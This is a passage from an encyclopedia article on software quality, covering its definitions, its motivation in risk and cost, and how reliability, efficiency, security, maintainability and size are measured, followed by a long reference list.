To view, explore, analyze, and communicate software quality measurements, concepts and techniques of information visualization provide visual, interactive means useful, in particular, if several software quality measures have to be related to each other or to components of a software or system. For example, software maps represent a specialized approach that "can express and combine information about software development, software quality, and system dynamics".[11]
Software quality also plays a role in the release phase of a software project. Specifically, the quality and establishment of the release processes (also patch processes),[12][13] configuration management[14] are important parts of an overall software engineering process.[15][16][17]


Motivation[edit]
Software quality is motivated by at least two main perspectives:

Risk management: Software failure has caused more than inconvenience. Software errors can cause human fatalities (see for example: List of software bugs). The causes have ranged from poorly designed user interfaces to direct programming errors,[18][19][20] see for example Boeing 737 case or Unintended acceleration cases[21][22] or Therac-25 cases.[23] This resulted in requirements for the development of some types of software, particularly and historically for software embedded in medical and other devices that regulate critical infrastructures: "[Engineers who write embedded software] see Java programs stalling for one third of a second to perform garbage collection and update the user interface, and they envision airplanes falling out of the sky.".[24] In the United States, within the Federal Aviation Administration (FAA), the FAA Aircraft Certification Service provides software programs, policy, guidance and training, focus on software and Complex Electronic Hardware that has an effect on the airborne product (a "product" is an aircraft, an engine, or a propeller).[25] Certification standards such as DO-178C, ISO 26262, IEC 62304, etc. provide guidance.
Cost management: As in any other fields of engineering, a software product or service governed by good software quality costs less to maintain, is easier to understand and can change more cost-effective in response to pressing business needs.[26] Industry data demonstrate that poor application structural quality in core business applications (such as enterprise resource planning (ERP), customer relationship management (CRM) or large transaction processing systems in financial services) results in cost, schedule overruns and creates waste in the form of rework (see Muda (Japanese term)).[27][28][29] Moreover, poor structural quality is strongly correlated with high-impact business disruptions due to corrupted data, application outages, security breaches, and performance problems.[30]
CISQ reports on the cost of poor quality estimates an impact of:
$2.08 trillion in 2020[31][32]
$2.84 trillion in 2018
IBM's Cost of a Data Breach Report 2020 estimates that the average global costs of a data breach:[33][34]
$3.86 million
Definitions[edit]
ISO[edit]
Software quality is "capability of a software product to conform to requirements."[35][36] while for others it can be synonymous with customer- or value-creation[37][38] or even defect level.[39]

ASQ[edit]
ASQ uses the following definition: Software quality describes the desirable attributes of software products. There are two main approaches exist: defect management and quality attributes.[40]

NIST[edit]
Software Assurance (SA) covers both the property and the process to achieve it:[41]

[Justifiable] confidence that software is free from vulnerabilities, either intentionally designed into the software or accidentally inserted at any time during its life cycle and that the software functions in the intended manner
The planned and systematic set of activities that ensure that software life cycle processes and products conform to requirements, standards, and procedures
PMI[edit]
The Project Management Institute's PMBOK Guide "Software Extension" defines not "Software quality" itself, but Software Quality Assurance (SQA) as "a continuous process that audits other software processes to ensure that those processes are being followed (includes for example a software quality management plan)." whereas Software Quality Control (SCQ) means "taking care of applying methods, tools, techniques to ensure satisfaction of the work products towards quality requirements for a software under development or modification."[42]

Other general and historic[edit]
The first definition of quality history remembers is from Shewhart in the beginning of 20th century: "There are two common aspects of quality: one of them has to do with the consideration of the quality of a thing as an objective reality independent of the existence of man. The other has to do with what we think, feel or sense as a result of the objective reality. In other words, there is a subjective side of quality."[43]
Kitchenham and Pfleeger, further reporting the teachings of David Garvin, identify five different perspectives on quality:[44][45]

The transcendental perspective deals with the metaphysical aspect of quality. In this view of quality, it is "something toward which we strive as an ideal, but may never implement completely".[46] It can hardly be defined, but is similar to what a federal judge once commented about obscenity: "I know it when I see it".[47]
The user perspective is concerned with the appropriateness of the product for a given context of use. Whereas the transcendental view is ethereal, the user view is more concrete, grounded in the product characteristics that meet user's needs.[46]
The manufacturing perspective represents quality as conformance to requirements. This aspect of quality is stressed by standards such as ISO 9001, which defines quality as "the degree to which a set of inherent characteristics fulfills requirements" (ISO/IEC 9001[48]).
The product perspective implies that quality can be appreciated by measuring the inherent characteristics of the product.
The final perspective of quality is value-based.[37] This perspective recognizes that the different perspectives of quality may have different importance, or value, to various stakeholders.
The problem inherent in attempts to define the quality of a product, almost any product, were stated by the master Walter A. Shewhart. The difficulty in defining quality is to translate future needs of the user into measurable characteristics, so that a product can be designed and turned out to give satisfaction at a price that the user will pay. This is not easy, and as soon as one feels fairly successful in the endeavor, he finds that the needs of the consumer have changed, competitors have moved in, etc.[49]— W. Edwards Deming
Quality is a customer determination, not an engineer's determination, not a marketing determination, nor a general management determination. It is based on the customer's actual experience with the product or service, measured against his or her requirements -- stated or unstated, conscious or merely sensed, technically operational or entirely subjective -- and always representing a moving target in a competitive market.[50]
The word quality has multiple meanings. Two of these meanings dominate the use of the word: 1. Quality consists of those product features which meet the need of customers and thereby provide product satisfaction. 2. Quality consists of freedom from deficiencies. Nevertheless, in a handbook such as this it is convenient to standardize on a short definition of the word quality as "fitness for use".[51]
Tom DeMarco has proposed that "a product's quality is a function of how much it changes the world for the better."[citation needed] This can be interpreted as meaning that functional quality and user satisfaction are more important than structural quality in determining software quality.
Another definition, coined by Gerald Weinberg in Quality Software Management: Systems Thinking, is "Quality is value to some person."[52][53] This definition stresses that quality is inherently subjective—different people will experience the quality of the same software differently. One strength of this definition is the questions it invites software teams to consider, such as "Who are the people we want to value our software?" and "What will be valuable to them?".

Other meanings and controversies[edit]
One of the challenges in defining quality is that "everyone feels they understand it"[54] and other definitions of software quality could be based on extending the various descriptions of the concept of quality used in business.
Software quality also often gets mixed-up with Quality Assurance or Problem Resolution Management[55] or Quality Control[56]  or DevOps. It does over-lap with before mentioned areas (see also PMI definitions), but is distinctive as it does not solely focus on testing but also on processes, management, improvements, assessments, etc.[56]


Measurement[edit]
Although the concepts presented in this section are applicable to both structural and functional software quality, measurement of the latter is essentially performed through testing [see main article: Software testing].[57] However, testing isn't enough: According to a study, individual programmers are less than 50% efficient at finding bugs in their own software. And most forms of testing are only 35% efficient. This makes it difficult to determine [software] quality.[58]

Introduction[edit]
 Relationship between software desirable characteristics (right) and measurable attributes (left).
Software quality measurement is about quantifying to what extent a system or software possesses desirable characteristics. This can be performed through qualitative or quantitative means or a mix of both. In both cases, for each desirable characteristic, there are a set of measurable attributes the existence of which in a piece of software or system tend to be correlated and associated with this characteristic. For example, an attribute associated with portability is the number of target-dependent statements in a program. More precisely, using the Quality Function Deployment approach, these measurable attributes are the "hows" that need to be enforced to enable the "whats" in the Software Quality definition above.
The structure, classification and terminology of attributes and metrics applicable to software quality management have been derived or extracted from the ISO 9126-3 and the subsequent ISO/IEC 25000:2005 quality model. The main focus is on internal structural quality. Subcategories have been created to handle specific areas like business application architecture and technical characteristics such as data access and manipulation or the notion of transactions.
The dependence tree between software quality characteristics and their measurable attributes is represented in the diagram on the right, where each of the 5 characteristics that matter for the user (right) or owner of the business system depends on measurable attributes (left):

Application Architecture Practices
Coding Practices
Application Complexity
Documentation
Portability
Technical and Functional Volume
Correlations between programming errors and production defects unveil that basic code errors account for 92 percent of the total errors in the source code. These numerous code-level issues eventually count for only 10 percent of the defects in production. Bad software engineering practices at the architecture levels account for only 8 percent of total defects, but consume over half the effort spent on fixing problems, and lead to 90 percent of the serious reliability, security, and efficiency issues in production.[59][60]

Code-based analysis[edit]
Many of the existing software measures count structural elements of the application that result from parsing the source code for such individual instructions[61] tokens[62] control structures (Complexity), and objects.[63]
Software quality measurement is about quantifying to what extent a system or software rates along these dimensions. The analysis can be performed using a qualitative or quantitative approach or a mix of both to provide an aggregate view [using for example weighted average(s) that reflect relative importance between the factors being measured].
This view of software quality on a linear continuum has to be supplemented by the identification of discrete Critical Programming Errors. These vulnerabilities may not fail a test case, but they are the result of bad practices that under specific circumstances can lead to catastrophic outages, performance degradations, security breaches, corrupted data, and myriad other problems[64] that make a given system de facto unsuitable for use regardless of its rating based on aggregated measurements. A well-known example of vulnerability is the Common Weakness Enumeration,[65] a repository of vulnerabilities in the source code that make applications exposed to security breaches.
The measurement of critical application characteristics involves measuring structural attributes of the application's architecture, coding, and in-line documentation, as displayed in the picture above. Thus, each characteristic is affected by attributes at numerous levels of abstraction in the application and all of which must be included calculating the characteristic's measure if it is to be a valuable predictor of quality outcomes that affect the business. The layered approach to calculating characteristic measures displayed in the figure above was first proposed by Boehm and his colleagues at TRW (Boehm, 1978)[66] and is the approach taken in the ISO 9126 and 25000 series standards. These attributes can be measured from the parsed results of a static analysis of the application source code. Even dynamic characteristics of applications such as reliability and performance efficiency have their causal roots in the static structure of the application.
Structural quality analysis and measurement is performed through the analysis of the source code, the architecture, software framework, database schema in relationship to principles and standards that together define the conceptual and logical architecture of a system. This is distinct from the basic, local, component-level code analysis typically performed by development tools which are mostly concerned with implementation considerations and are crucial during debugging and testing activities.

Reliability[edit]
The root causes of poor reliability are found in a combination of non-compliance with good architectural and coding practices. This non-compliance can be detected by measuring the static quality attributes of an application. Assessing the static attributes underlying an application's reliability provides an estimate of the level of business risk and the likelihood of potential application failures and defects the application will experience when placed in operation.
Assessing reliability requires checks of at least the following software engineering best practices and technical attributes:


Application Architecture Practices
Coding Practices
Complexity of algorithms
Complexity of programming practices
Compliance with Object-Oriented and Structured Programming best practices (when applicable)
Component or pattern re-use ratio
Dirty programming
Error & Exception handling (for all layers - GUI, Logic & Data)
Multi-layer design compliance
Resource bounds management
Software avoids patterns that will lead to unexpected behaviors
Software manages data integrity and consistency
Transaction complexity level

Depending on the application architecture and the third-party components used (such as external libraries or frameworks), custom checks should be defined along the lines drawn by the above list of best practices to ensure a better assessment of the reliability of the delivered software.

Efficiency[edit]
As with Reliability, the causes of performance inefficiency are often found in violations of good architectural and coding practice which can be detected by measuring the static quality attributes of an application. These static attributes predict potential operational performance bottlenecks and future scalability problems, especially for applications requiring high execution speed for handling complex algorithms or huge volumes of data.
Assessing performance efficiency requires checking at least the following software engineering best practices and technical attributes:

Application Architecture Practices
Appropriate interactions with expensive and/or remote resources
Data access performance and data management
Memory, network and disk space management
Compliance with Coding Practices[67] (Best coding practices)
Security[edit]
Software quality includes software security.[68] Many security vulnerabilities result from poor coding and architectural practices such as SQL injection or cross-site scripting.[69][70] These are well documented in lists maintained by CWE,[71] and the SEI/Computer Emergency Center (CERT) at Carnegie Mellon University.[67]
Assessing security requires at least checking the following software engineering best practices and technical attributes:

Implementation, Management of a security-aware and hardening development process, e.g. Security Development Lifecycle (Microsoft) or IBM's Secure Engineering Framework.[72]
Secure Application Architecture Practices[73][74]
Multi-layer design compliance
Security best practices (Input Validation, SQL Injection, Cross-Site Scripting, Access control etc.)[75][76]
Secure and good Programming Practices[67]
Error & Exception handling
Maintainability[edit]
Maintainability includes concepts of modularity, understandability, changeability, testability, reusability, and transferability from one development team to another. These do not take the form of critical issues at the code level. Rather, poor maintainability is typically the result of thousands of minor violations with best practices in documentation, complexity avoidance strategy, and basic programming practices that make the difference between clean and easy-to-read code vs. unorganized and difficult-to-read code.[77]
Assessing maintainability requires checking the following software engineering best practices and technical attributes:


Application Architecture Practices
Architecture, Programs and Code documentation embedded in source code
Code readability
Code smells
Complexity level of transactions
Complexity of algorithms
Complexity of programming practices
Compliance with Object-Oriented and Structured Programming best practices (when applicable)
Component or pattern re-use ratio
Controlled level of dynamic coding
Coupling ratio
Dirty programming
Documentation
Hardware, OS, middleware, software components and database independence
Multi-layer design compliance
Portability
Programming Practices (code level)
Reduced duplicate code and functions
Source code file organization cleanliness

Maintainability is closely related to Ward Cunningham's concept of technical debt, which is an expression of the costs resulting of a lack of maintainability. Reasons for why maintainability is low can be classified as reckless vs. prudent and deliberate vs. inadvertent,[78] and often have their origin in developers' inability, lack of time and goals, their carelessness and discrepancies in the creation cost of and benefits from documentation and, in particular, maintainable source code.[79]

Size[edit]
Measuring software size requires that the whole source code be correctly gathered, including database structure scripts, data manipulation source code, component headers, configuration files etc. There are essentially two types of software sizes to be measured, the technical size (footprint) and the functional size:

There are several software technical sizing methods that have been widely described. The most common technical sizing method is number of Lines of Code (#LOC) per technology, number of files, functions, classes, tables, etc., from which backfiring Function Points can be computed;
The most common for measuring functional size is function point analysis. Function point analysis measures the size of the software deliverable from a user's perspective. Function point sizing is done based on user requirements and provides an accurate representation of both size for the developer/estimator and value (functionality to be delivered) and reflects the business functionality being delivered to the customer. The method includes the identification and weighting of user recognizable inputs, outputs and data stores. The size value is then available for use in conjunction with numerous measures to quantify and to evaluate software delivery and performance (development cost per function point; delivered defects per function point; function points per staff month.).
The function point analysis sizing standard is supported by the International Function Point Users Group (IFPUG). It can be applied early in the software development life-cycle and it is not dependent on lines of code like the somewhat inaccurate Backfiring method. The method is technology agnostic and can be used for comparative analysis across organizations and across industries.
Since the inception of Function Point Analysis, several variations have evolved and the family of functional sizing techniques has broadened to include such sizing measures as COSMIC, NESMA, Use Case Points, FP Lite, Early and Quick FPs, and most recently Story Points. However, Function Points has a history of statistical accuracy, and has been used as a common unit of work measurement in numerous application development management (ADM) or outsourcing engagements, serving as the "currency" by which services are delivered and performance is measured.
One common limitation to the Function Point methodology is that it is a manual process and therefore it can be labor-intensive and costly in large scale initiatives such as application development or outsourcing engagements. This negative aspect of applying the methodology may be what motivated industry IT leaders to form the Consortium for IT Software Quality focused on introducing a computable metrics standard for automating the measuring of software size while the IFPUG keep promoting a manual approach as most of its activity rely on FP counters certifications.
CISQ defines Sizing as to estimate the size of software to support cost estimating, progress tracking or other related software project management activities. Two standards are used: Automated Function Points to measure the functional size of software and Automated Enhancement Points to measure the size of both functional and non-functional code in one measure.[80]

Identifying critical programming errors[edit]
  
Critical Programming Errors are specific architectural and/or coding bad practices that result in the highest, immediate or long term, business disruption risk.[81]
These are quite often technology-related and depend heavily on the context, business objectives and risks. Some may consider respect for naming conventions while others – those preparing the ground for a knowledge transfer for example – will consider it as absolutely critical.
Critical Programming Errors can also be classified per CISQ Characteristics. Basic example below: 

Reliability
Avoid software patterns that will lead to unexpected behavior (Uninitialized variable, null pointers, etc.)
Methods, procedures and functions doing Insert, Update, Delete, Create Table or Select must include error management
Multi-thread functions should be made thread safe, for instance servlets or struts action classes must not have instance/non-final static fields
Efficiency
Ensure centralization of client requests (incoming and data) to reduce network traffic
Avoid SQL queries that don't use an index against large tables in a loop
Security
Avoid fields in servlet classes that are not final static
Avoid data access without including error management
Check control return codes and implement error handling mechanisms
Ensure input validation to avoid cross-site scripting flaws or SQL injections flaws
Maintainability
Deep inheritance trees and nesting should be avoided to improve comprehensibility
Modules should be loosely coupled (fanout, intermediaries) to avoid propagation of modifications
Enforce homogeneous naming conventions
Operationalized quality models[edit]
Newer proposals for quality models such as Squale and Quamoco[82] propagate a direct integration of the definition of quality attributes and measurement. By breaking down quality attributes or even defining additional layers, the complex, abstract quality attributes (such as reliability or maintainability) become more manageable and measurable. Those quality models have been applied in industrial contexts but have not received widespread adoption.

Trivia[edit]
"A science is as mature as its measurement tools."[83]
"I know it when I see it."
"You cannot control what you cannot measure."[7] (Tom DeMarco)
"You cannot inspect quality into a product." (W. Edwards Deming)[84]
"The bitterness of poor quality remains long after the sweetness of meeting the schedule has been forgotten." (Anonymous)[84]
"If you don't start with a spec, every piece of code you write is a patch." (Leslie Lamport)
See also[edit]

Anomaly in software
Accessibility
Availability
Best coding practices
Cohesion and Coupling
Cyclomatic complexity
Coding conventions
Computer bug
Dependability
GQM
ISO/IEC 9126
Software Process Improvement and Capability Determination - ISO/IEC 15504
Programming style
Quality: quality control, total quality management.
Requirements management
Scope (project management)
Security
Security engineering
Software quality assurance
Software architecture
Software quality control
Software metrics
Software reusability
Software standard
Software testing
Testability
Static program analysis
Further reading[edit]
Android OS Quality Guidelines including checklists for UI, Security, etc. July 2021
Association of Maritime Managers in Information Technology & Communications (AMMITEC). Maritime Software Quality Guidelines. September 2017
Capers Jones and Olivier Bonsignour, "The Economics of Software Quality", Addison-Wesley Professional, 1st edition, December 31, 2011, ISBN 978-0-13-258220-9
CAT Lab - CNES Code Analysis Tools Laboratory (on GitHub)
Girish Suryanarayana, Software Process versus Design Quality: Tug of War?[85]
Ho-Won Jung, Seung-Gweon Kim, and Chang-Sin Chung. Measuring software product quality: A survey of ISO/IEC 9126. IEEE Software, 21(5):10–13, September/October 2004.
International Organization for Standardization. Software Engineering—Product Quality—Part 1: Quality Model. ISO, Geneva, Switzerland, 2001. ISO/IEC 9126-1:2001(E).
Measuring Software Product Quality: the ISO 25000 Series and CMMI (SEI site)
MSQF - A measurement based software quality framework Cornell University Library
Omar Alshathry, Helge Janicke, "Optimizing Software Quality Assurance," compsacw, pp. 87–92, 2010 IEEE 34th Annual Computer Software and Applications Conference Workshops, 2010.
Robert L. Glass. Building Quality Software. Prentice Hall, Upper Saddle River, NJ, 1992.
Roland Petrasch, "The Definition of 'Software Quality': A Practical Approach", ISSRE, 1999
Software Quality Professional,[86] American Society for Quality (ASQ)
Software Quality Journal[87] by Springer Nature
Spinellis, Diomidis (2006-04-04). Code quality: the open source perspective. Upper Saddle River, New Jersey, US: Addison-Wesley Professional. ISBN 978-0-321-16607-4.
Stephen H. Kan. Metrics and Models in Software Quality Engineering. Addison-Wesley, Boston, MA, second edition, 2002.
Stefan Wagner. Software Product Quality Control. Springer, 2013.
References[edit]
Notes



^ Board (IREB), International Requirements Engineering. "Learning from history: The case of Software Requirements Engineering – Requirements Engineering Magazine". Learning from history: The case of Software Requirements Engineering – Requirements Engineering Magazine. Retrieved 2021-02-25.

^ Pressman, Roger S. (2005). Software Engineering: A Practitioner's Approach (Sixth International ed.). McGraw-Hill Education. p. 388. ISBN 0071267824.

^ "About the Automated Source Code Quality Measures Specification Version 1.0". www.omg.org. Retrieved 2021-02-25.

^ "How to Perform End-to-End Testing". smartbear.com. Retrieved 2021-02-25.

^ "How to Deliver Resilient, Secure, Efficient, and Easily Changed IT Systems in Line with CISQ Recommendations" (PDF). Archived (PDF) from the original on 2013-12-28. Retrieved 2013-10-18.

^ 14:00-17:00. "ISO/IEC 25010:2011". ISO. Retrieved 2021-02-23.{{cite web}}:  CS1 maint: numeric names: authors list (link)

^ a b Armour, Phillip G. (2012-06-01). "A measure of control". Communications of the ACM. 55 (6): 26–28. doi:10.1145/2184319.2184329. ISSN 0001-0782. S2CID 6059054.

^ Voas, J. (November 2011). "Software's secret sauce: the "-ilities" [software quality]". IEEE Software. 21 (6): 14–15. doi:10.1109/MS.2004.54. ISSN 1937-4194.

^ "Code Quality Standards | CISQ - Consortium for Information & Software Quality". www.it-cisq.org. Retrieved 2021-02-25.

^ "Software Sizing Standards | CISQ - Consortium for Information & Software Quality". www.it-cisq.org. Retrieved 2021-02-25.

^ J. Bohnet, J. Döllner Archived 2014-04-27 at the Wayback Machine, "Monitoring Code Quality and Development Activity by Software Maps". Proceedings of the IEEE ACM ICSE Workshop on Managing Technical Debt, pp. 9-16, 2011.

^ "IIA - Global Technology Audit Guide: IT Change Management: Critical for Organizational Success". na.theiia.org. Retrieved 2021-02-26.{{cite web}}:  CS1 maint: url-status (link)

^ Boursier, Jérôme (2018-01-11). "Meltdown and Spectre fallout: patching problems persist". Malwarebytes Labs. Retrieved 2021-02-26.

^ mestew. "Best practices for software updates - Configuration Manager". docs.microsoft.com. Retrieved 2021-02-26.

^ Wright, Hyrum K. (2009-08-25). "Release engineering processes, models, and metrics". Proceedings of the Doctoral Symposium for ESEC/FSE on Doctoral Symposium. ESEC/FSE Doctoral Symposium '09. Amsterdam, The Netherlands: Association for Computing Machinery: 27–28. doi:10.1145/1595782.1595793. ISBN 978-1-60558-731-8. S2CID 10483918.

^ van der Hoek, André; Hall, Richard S.; Heimbigner, Dennis; Wolf, Alexander L. (November 1997). "Software release management". ACM SIGSOFT Software Engineering Notes. 22 (6): 159–175. doi:10.1145/267896.267909. ISSN 0163-5948.

^ Moore, Mike Sutton and Tym (2008-07-30). "7 Ways to Improve Your Software Release Management". CIO. Retrieved 2021-02-26.

^ Clark, Mitchell (2021-02-24). "iRobot says it'll be a few weeks until it can clean up its latest Roomba software update mess". The Verge. Retrieved 2021-02-25.

^ "Top 25 Software Errors | SANS Institute". www.sans.org. Retrieved 2021-02-25.

^ "'Turn it Off and On Again Every 149 Hours' Is a Concerning Remedy for a $300 Million Airbus Plane's Software Bug". Gizmodo. Retrieved 2021-02-25.

^ Software, Gimpel. "MISRA C, Toyota and the Death of Task X". Retrieved 2021-02-25.

^ "An Update on Toyota and Unintended Acceleration « Barr Code". embeddedgurus.com. Retrieved 2021-02-25.

^ Medical Devices: The Therac-25* Archived 2008-02-16 at the Wayback Machine, Nancy Leveson, University of Washington

^ Embedded Software Archived 2010-07-05 at the Wayback Machine, Edward A. Lee, To appear in Advances in Computers
(Marvin Victor Zelkowitz, editor), Vol. 56, Academic Press, London, 2002, Revised from UCB ERL Memorandum M01/26
University of California, Berkeley, CA 94720, USA, November 1, 2001

^ "Aircraft Certification Software and Airborne Electronic Hardware". Archived from the original on 4 October 2014. Retrieved 28 September 2014.

^ "The Cost of Poor Software Quality in the US: A 2020 Report | CISQ - Consortium for Information & Software Quality". www.it-cisq.org. Retrieved 2021-02-25.

^ "What is Waste? | Agile Alliance". Agile Alliance |. Retrieved 2021-02-25.

^ January 26, Scott Matteson in Software on; 2018; Pst, 7:54 Am. "Report: Software failure caused $1.7 trillion in financial losses in 2017". TechRepublic. Retrieved 2021-02-25.{{cite web}}:  CS1 maint: numeric names: authors list (link)

^ Cohane, Ryan (2017-11-16). "Financial Cost of Software Bugs". Medium. Retrieved 2021-02-25.

^ Eloff, Jan; Bella, Madeleine Bihina (2018), "Software Failures: An Overview", Software Failure Investigation, Cham: Springer International Publishing, pp. 7–24, doi:10.1007/978-3-319-61334-5_2, ISBN 978-3-319-61333-8, retrieved 2021-02-25

^ "Poor software quality cost businesses $2 trillion last year and put security at risk". CIO Dive. Retrieved 2021-02-26.

^ "Synopsys-Sponsored CISQ Research Estimates Cost of Poor Software Quality in the US $2.08 Trillion in 2020". finance.yahoo.com. Retrieved 2021-02-26.

^ "What Does a Data Breach Cost in 2020?". Digital Guardian. 2020-08-06. Retrieved 2021-03-08.

^ "Cost of a Data Breach Report 2020 | IBM". www.ibm.com. 2020. Retrieved 2021-03-08.{{cite web}}:  CS1 maint: url-status (link)

^ "ISO - ISO 9000 family — Quality management". ISO. Retrieved 2021-02-24.

^ 14:00-17:00. "ISO/IEC/IEEE 24765:2017". ISO. Retrieved 2021-02-24.{{cite web}}:  CS1 maint: numeric names: authors list (link)

^ a b "Mastering automotive software | McKinsey". www.mckinsey.com. Retrieved 2021-02-25.

^ 14:00-17:00. "ISO/IEC 25010:2011". ISO. Retrieved 2021-02-24.{{cite web}}:  CS1 maint: numeric names: authors list (link)

^ Wallace, D.R. (2002). "Practical software reliability modeling". Proceedings 26th Annual NASA Goddard Software Engineering Workshop. Greenbelt, MD, USA: IEEE Comput. Soc: 147–155. doi:10.1109/SEW.2001.992668. ISBN 978-0-7695-1456-7. S2CID 57382117.

^ "What is Software Quality? | ASQ". asq.org. Retrieved 2021-02-24.

^ "SAMATE - Software Assurance Metrics And Tool Evaluation project main page". Nist. 3 February 2021. Retrieved 2021-02-26.

^ Software extension to the PMBOK guide. Project Management Institute (5th ed.). Newtown Square, Pennsylvania. 2013. ISBN 978-1-62825-041-1. OCLC 959513383.{{cite book}}:  CS1 maint: others (link)

^ SHEWHART, WALTER A. (2015). Economioc control of quality of manufactured product. [Place of publication not identified]: MARTINO FINE Books. ISBN 978-1-61427-811-5. OCLC 1108913766.

^ Kitchenham, B.; Pfleeger, S. L. (January 1996). "Software quality: the elusive target [special issues section]". IEEE Software. 13 (1): 12–21. doi:10.1109/52.476281. ISSN 1937-4194.

^ Garvin, David A. (1988). Managing quality : the strategic and competitive edge. New York: Free Press. ISBN 0-02-911380-6. OCLC 16005388.

^ a b B. Kitchenham and S. Pfleeger, "Software quality: the elusive target", IEEE Software, vol. 13, no. 1, pp. 12–21, 1996.

^ Kan, Stephen H. (2003). Metrics and models in software quality engineering (2nd ed.). Boston: Addison-Wesley. ISBN 0-201-72915-6. OCLC 50149641.

^ International Organization for Standardization, "ISO/IEC 9001: Quality management systems -- Requirements," 1999.

^ W. E. Deming, "Out of the crisis: quality, productivity and competitive position". Cambridge University Press, 1988.

^ A. V. Feigenbaum, "Total Quality Control", McGraw-Hill, 1983.

^ J.M. Juran, "Juran's Quality Control Handbook", McGraw-Hill, 1988.

^ Weinberg, Gerald M. (1991). Quality software management: Volume 1, Systems Thinking. New York, N.Y.: Dorset House. ISBN 0-932633-22-6. OCLC 23870230.

^ Weinberg, Gerald M. (1993). Quality software management: Volume 2, First-Order Measurement. New York, N.Y.: Dorset House. ISBN 0-932633-22-6. OCLC 23870230.

^ Crosby, P., Quality is Free, McGraw-Hill, 1979

^ "SUP.9 – Problem Resolution Management - Kugler Maag Cie". www.kuglermaag.com. Retrieved 2021-02-25.

^ a b Hoipt (2019-11-29). "Organizations often use the terms 'Quality Assurance' (QA) vs 'Quality Control' (QC)…". Medium. Retrieved 2021-02-25.

^ Wallace, D.; Watson, A. H.; Mccabe, T. J. (1996-08-01). "Structured Testing: A Testing Methodology Using the Cyclomatic Complexity Metric". Nist.

^ Bellairs, Richard. "What Is Code Quality? And How to Improve Code Quality". Perforce Software. Retrieved 2021-02-28.

^ "OMG Whitepaper | CISQ - Consortium for Information & Software Quality". www.it-cisq.org. Retrieved 2021-02-26.

^ "How to Deliver Resilient, Secure, Efficient and Agile IT Systems in Line with CISQ Recommendations - Whitepaper | Object Management Group" (PDF). Archived (PDF) from the original on 2013-12-28. Retrieved 2013-10-18.

^ "Software Size Measurement: A Framework for Counting Source Statements". resources.sei.cmu.edu. Retrieved 2021-02-24.

^ Halstead, Maurice H. (1977). Elements of Software Science (Operating and programming systems series). USA: Elsevier Science Inc. ISBN 978-0-444-00205-1.

^ Chidamber, S. R.; Kemerer, C. F. (June 1994). "A metrics suite for object oriented design". IEEE Transactions on Software Engineering. 20 (6): 476–493. doi:10.1109/32.295895. hdl:1721.1/48424. ISSN 1939-3520.

^ Nygard, Michael (2007). Release It!. an O'Reilly Media Company Safari (1st ed.). ISBN 978-0978739218. OCLC 1102387436.

^ "CWE - Common Weakness Enumeration". cwe.mitre.org. Archived from the original on 2016-05-10. Retrieved 2016-05-20.

^ Boehm, B., Brown, J.R., Kaspar, H., Lipow, M., MacLeod, G.J., & Merritt, M.J. (1978). Characteristics of Software Quality. North-Holland.

^ a b c "SEI CERT Coding Standards - CERT Secure Coding - Confluence". wiki.sei.cmu.edu. Retrieved 2021-02-24.

^ "Code quality and code security: How are they related? | Synopsys". Software Integrity Blog. 2019-05-24. Retrieved 2021-03-09.

^ "Cost of a Data Breach Report 2020 | IBM". www.ibm.com. 2020. Retrieved 2021-03-09.{{cite web}}:  CS1 maint: url-status (link)

^ "Key Takeaways from the 2020 Cost of a Data Breach Report". Bluefin. 2020-08-27. Retrieved 2021-03-09.

^ "CWE - Common Weakness Enumeration". Cwe.mitre.org. Archived from the original on 2013-10-14. Retrieved 2013-10-18.

^ Security in Development: The IBM Secure Engineering Framework | IBM Redbooks. 2016-09-30.

^ Enterprise Security Architecture Using IBM Tivoli Security Solutions | IBM Redbooks. 2016-09-30.

^ "Secure Architecture Design Definitions | CISA". us-cert.cisa.gov. Retrieved 2021-03-09.

^ "OWASP Foundation | Open Source Foundation for Application Security". owasp.org. Retrieved 2021-02-24.

^ "CWE's Top 25". Sans.org. Retrieved 2013-10-18.

^ IfSQ Level-2 A Foundation-Level Standard for Computer Program Source Code Archived 2011-10-27 at the Wayback Machine, Second Edition August 2008, Graham Bolton, Stuart Johnston, IfSQ, Institute for Software Quality.

^ Fowler, Martin (October 14, 2009). "TechnicalDebtQuadrant". Archived from the original on February 2, 2013. Retrieved February 4, 2013.

^ Prause, Christian; Durdik, Zoya (June 3, 2012). "Architectural design and documentation: Waste in agile development?". 2012 International Conference on Software and System Process (ICSSP). IEEE Computer Society. pp. 130–134. doi:10.1109/ICSSP.2012.6225956. ISBN 978-1-4673-2352-9. S2CID 15216552.

^ "Software Sizing Standards | CISQ - Consortium for Information & Software Quality". www.it-cisq.org. Retrieved 2021-01-28.

^ "Why Software fails". IEEE Spectrum: Technology, Engineering, and Science News. 2 September 2005. Retrieved 2021-03-20.{{cite web}}:  CS1 maint: url-status (link)

^ Wagner, Stefan; Goeb, Andreas; Heinemann, Lars; Kläs, Michael; Lampasona, Constanza; Lochmann, Klaus; Mayr, Alois; Plösch, Reinhold; Seidl, Andreas (2015). "Operationalised product quality models and assessment: The Quamoco approach" (PDF). Information and Software Technology. 62: 101–123. arXiv:1611.09230. doi:10.1016/j.infsof.2015.02.009. S2CID 10992384.

^ Ebert, Christof (2010). Software Measurement: Establish - Extract - Evaluate - Execute. ISBN 9783642090806. OCLC 941931829.

^ a b "Managing the Unmanageable: More Rules of Thumb". www.managingtheunmanageable.net. Retrieved 2021-02-26.

^ Suryanarayana, Girish (2015). "Software Process versus Design Quality: Tug of War?". IEEE Software. 32 (4): 7–11. doi:10.1109/MS.2015.87. S2CID 9226051.

^ "Software Quality Professional | ASQ". asq.org. Retrieved 2021-01-28.

^ "Software Quality Journal". Springer. Retrieved 2021-01-28.


Bibliography


Albrecht, A. J. (1979), Measuring application development productivity. In Proceedings of the Joint SHARE/GUIDE IBM Applications Development Symposium., IBM
Ben-Menachem, M.; Marliss, G. S. (1997), Software Quality, Producing Practical and Consistent Software, Thomson Computer Press
Boehm, B.; Brown, J.R.; Kaspar, H.; Lipow, M.; MacLeod, G.J.; Merritt, M.J. (1978), Characteristics of Software Quality, North-Holland.
Chidamber, S.; Kemerer, C. (1994), A Metrics Suite for Object Oriented Design. IEEE Transactions on Software Engineering, 20 (6), pp. 476–493
Ebert, Christof; Dumke, Reiner, Software Measurement: Establish - Extract - Evaluate - Execute, Kindle Edition, p. 91
Garmus, D.; Herron, D. (2001), Function Point Analysis, Addison Wesley
Halstead, M.E. (1977), Elements of Software Science, Elsevier North-Holland
Hamill, M.; Goseva-Popstojanova, K. (2009), Common faults in software fault and failure data. IEEE Transactions of Software Engineering, 35 (4), pp. 484–496
Jackson, D.J. (2009), A direct path to dependable software. Communications of the ACM, 52 (4).
